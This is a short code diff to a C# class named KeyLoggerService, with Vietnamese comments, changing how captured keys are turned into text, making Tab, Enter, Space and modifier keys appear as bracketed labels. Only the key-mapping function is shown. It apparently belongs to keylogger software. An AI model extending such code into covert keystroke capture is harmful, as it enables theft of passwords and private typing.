@@ -165,12 +165,10 @@ public class KeyLoggerService
             case Keys.PageUp: return "[PgUp]";
 
             // ====== Hàng 3: Tab Q-P [ ] \ ======
-            case Keys.Tab: return "\t";
+            case Keys.Tab: return "[Tab]";
             case Keys.OemOpenBrackets: return shiftPressed ? "{" : "[";
-            case Keys.Oem6: return shiftPressed ? "}" : "]";  // OemCloseBrackets
-            case Keys.OemCloseBrackets: return shiftPressed ? "}" : "]";
-            case Keys.Oem5: return shiftPressed ? "|" : "\\";  // Backslash key
-            case Keys.OemPipe: return shiftPressed ? "|" : "\\";
+            case Keys.Oem6: return shiftPressed ? "}" : "]";  // OemCloseBrackets (same as Oem6=221)
+            case Keys.Oem5: return shiftPressed ? "|" : "\\";  // Backslash/OemPipe (same as Oem5=220)
             case Keys.Delete: return "[Del]";
             case Keys.End: return "[End]";
             case Keys.PageDown: return "[PgDn]";
@@ -179,7 +177,7 @@ public class KeyLoggerService
             case Keys.Capital: return "[CapsLk]";
             case Keys.Oem1: return shiftPressed ? ":" : ";";  // Semicolon
             case Keys.Oem7: return shiftPressed ? "\"" : "'"; // Quote
-            case Keys.Enter: return "\n";
+            case Keys.Enter: return "[Enter]";
 
             // ====== Hàng 5: Shift Z-M , . / Shift ======
             case Keys.Oemcomma: return shiftPressed ? "<" : ",";
@@ -188,7 +186,7 @@ public class KeyLoggerService
             case Keys.Up: return "[Up]";
 
             // ====== Hàng 6: Ctrl Win Alt Space Alt Fn Ctrl ======
-            case Keys.Space: return " ";
+            case Keys.Space: return "[Space]";
             case Keys.Left: return "[Left]";
             case Keys.Down: return "[Down]";
             case Keys.Right: return "[Right]";
@@ -212,16 +210,18 @@ public class KeyLoggerService
             case Keys.NumPad9: return "9";
             case Keys.Decimal: return ".";
 
-            // ====== Modifiers - Ghi nhận nhưng không log riêng ======
-            case Keys.LShiftKey:
-            case Keys.RShiftKey:
-            case Keys.LControlKey:
-            case Keys.RControlKey:
-            case Keys.LMenu:      // Left Alt
-            case Keys.RMenu:      // Right Alt
-            case Keys.LWin:
-            case Keys.RWin:
-                return "";
+            // ====== Modifiers - Log special keys ======
+            case Keys.LShiftKey: return "[LShift]";
+            case Keys.RShiftKey: return "[RShift]";
+            case Keys.LControlKey: return "[LCtrl]";
+            case Keys.RControlKey: return "[RCtrl]";
+            case Keys.LMenu: return "[LAlt]";      // Left Alt
+            case Keys.RMenu: return "[RAlt]";      // Right Alt
+            case Keys.LWin: return "[LWin]";
+            case Keys.RWin: return "[RWin]";
+            case Keys.ControlKey: return "[Ctrl]";
+            case Keys.ShiftKey: return "[Shift]";
+            case Keys.Menu: return "[Alt]";
 
             default:
                 // ====== Chữ cái A-Z ======
@@ -229,7 +229,7 @@ public class KeyLoggerService
                 {
                     return uppercase ? key.ToString().ToUpper() : key.ToString().ToLower();
                 }
-                // Các phím khác không xác định
+                // Các phím khác không xác định -> hiển thị [KEY]
                 return $"[{key}]";
         }
     }
